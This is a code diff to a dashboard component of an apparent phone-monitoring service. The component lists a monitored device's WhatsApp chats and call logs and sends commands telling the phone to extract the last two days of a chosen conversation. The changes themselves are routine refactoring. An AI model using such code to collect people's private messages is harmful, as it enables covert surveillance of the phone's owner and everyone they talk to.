@@ -326,31 +326,14 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         });
       }
 
-      const [waData, allMsgs, callsResponse, rawCallLogs] = await Promise.all([
+      const [waData, callsResponse, rawCallLogs] = await Promise.all([
         devicesApi.whatsAppChats(deviceId).catch((err) => {
           console.warn("WhatsApp chats fetch error:", err);
           return [] as WhatsAppChatSummary[];
         }),
-        devicesApi.whatsAppMessages(deviceId).catch((err) => {
-          console.warn("WhatsApp all messages fetch error:", err);
-          return [] as WhatsAppMessage[];
-        }),
         devicesApi.whatsAppCalls(deviceId).catch(() => ({ whatsapp_calls: [], device_calls: [] })),
         devicesApi.callLog(deviceId).catch(() => [] as CallLogEntry[]),
       ]);
-
-      // 1. Process Genuine WhatsApp Chats (from monitored phone, e.g. Team lead, Kavin Bro, Niklaus)
-      const latestRealByChat = new Map<string, WhatsAppMessage>();
-      const countRealByChat = new Map<string, number>();
-      for (const m of (allMsgs || [])) {
-        if (!m.chat_name || !m.chat_name.trim()) continue;
-        const key = m.chat_name.trim().toLowerCase();
-        countRealByChat.set(key, (countRealByChat.get(key) || 0) + 1);
-        const existing = latestRealByChat.get(key);
-        if (!existing || new Date(m.message_time).getTime() > new Date(existing.message_time).getTime()) {
-          latestRealByChat.set(key, m);
-        }
-      }
 
       const isSystemNoise = (name: string | null | undefined): boolean => {
         if (!name) return true;
@@ -403,37 +386,16 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         if (!c.chat_name || !c.chat_name.trim()) continue;
         if (isSystemNoise(c.chat_name)) continue;
         const key = c.chat_name.trim().toLowerCase();
-        const realMsg = latestRealByChat.get(key);
-
-        const cTime = c.last_message_at ? new Date(c.last_message_at).getTime() : 0;
-        const rTime = realMsg?.message_time ? new Date(realMsg.message_time).getTime() : 0;
-        const latestTime = rTime > cTime ? realMsg!.message_time : (c.last_message_at || new Date().toISOString());
-        const latestText = rTime > cTime ? (realMsg?.message_text || c.last_message) : (c.last_message || realMsg?.message_text || null);
-        const latestOutgoing = rTime > cTime ? Boolean(realMsg?.is_outgoing) : Boolean(c.last_is_outgoing);
+        if (seenChats.has(key)) continue;
 
         cleanedChats.push({
           chat_name: c.chat_name.trim(),
-          total_messages: Math.max(countRealByChat.get(key) || 0, c.total_messages || 0),
-          last_message_at: latestTime,
-          last_message: latestText,
-          last_is_outgoing: latestOutgoing,
+          total_messages: c.total_messages || 0,
+          last_message_at: c.last_message_at || new Date().toISOString(),
+          last_message: c.last_message || null,
+          last_is_outgoing: Boolean(c.last_is_outgoing),
         });
         seenChats.add(key);
-      }
-
-      for (const [key, realMsg] of latestRealByChat.entries()) {
-        if (!seenChats.has(key)) {
-          if (isSystemNoise(realMsg.chat_name)) continue;
-
-          cleanedChats.push({
-            chat_name: realMsg.chat_name.trim(),
-            total_messages: countRealByChat.get(key) || 1,
-            last_message_at: realMsg.message_time,
-            last_message: realMsg.message_text,
-            last_is_outgoing: Boolean(realMsg.is_outgoing),
-          });
-          seenChats.add(key);
-        }
       }
 
       cleanedChats.sort((a, b) => new Date(b.last_message_at).getTime() - new Date(a.last_message_at).getTime());
@@ -476,26 +438,6 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         }
       }
 
-      for (const m of (allMsgs || [])) {
-        const text = (m.message_text || "").toLowerCase();
-        if ((text.includes("call") || text.includes("missed")) && isWithinLast5Days(m.message_time)) {
-          const key = `msg-${m.id}`;
-          if (!mergedCallsMap.has(key)) {
-            const isMissed = text.includes("missed");
-            const isOutgoing = Boolean(m.is_outgoing);
-            mergedCallsMap.set(key, {
-              id: key,
-              name: m.chat_name || "WhatsApp Contact",
-              number: isPhoneNumberString(m.chat_name) ? m.chat_name : (m.sender || ""),
-              timestamp: m.message_time,
-              direction: isMissed ? "missed" : isOutgoing ? "outgoing" : "incoming",
-              call_type: text.includes("video") ? "video" : "voice",
-              duration_sec: 0,
-              source: "whatsapp",
-            });
-          }
-        }
-      }
 
       const sortedCalls = Array.from(mergedCallsMap.values()).sort(
         (a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
@@ -665,18 +607,21 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
 
   // --------------------------------------------------------------------------
   // REQUEST CHAT CONTENTS FROM MOBILE APP (LAST 2 DAYS)
-  // --------------------------------------------------------------------------
   const requestChatFromMobileApp = async (chatName: string) => {
     if (!chatName || !chatName.trim()) return;
     const cleanName = chatName.trim();
     setRequestingChat(cleanName);
     setMobileRequestStatus({
       chat: cleanName,
-      text: `Requesting chat contents for last 2 days from mobile app...`,
+      text: `Purged previous chat. Requesting last 2 days conversation for "${cleanName}" from phone...`,
       state: "pending",
     });
 
     try {
+      // 1. Clear other stored conversation messages from DB so DB storage is minimal & messages don't mix
+      await devicesApi.clearWhatsAppMessages(deviceId, cleanName).catch(() => {});
+
+      // 2. Dispatch command to mobile app to fetch last 2 days conversation
       const cmd = await devicesApi.createCommand(deviceId, "get_whatsapp_chat", {
         chatName: cleanName,
         days: 2,
@@ -685,7 +630,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
       if (cmd?.id) {
         setMobileRequestStatus({
           chat: cleanName,
-          text: `Request sent to mobile app. Waiting for device to extract last 2 days conversation...`,
+          text: `Request sent to mobile app. Fetching last 2 days conversation for "${cleanName}"...`,
           state: "pending",
         });
 
@@ -722,7 +667,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         if (!finished) {
           setMobileRequestStatus({
             chat: cleanName,
-            text: `Command queued on device. Loading available conversation contents...`,
+            text: `Command dispatched to device. Displaying latest conversation contents...`,
             state: "success",
           });
         }
@@ -744,6 +689,9 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   };
 
   const handleSelectChat = (c: UnifiedChatSummary) => {
+    if (selectedChatId !== c.id) {
+      setActiveThreadMessages([]); // Instantly clear previous conversation view
+    }
     setSelectedChatId(c.id);
     requestChatFromMobileApp(c.chatName);
   };
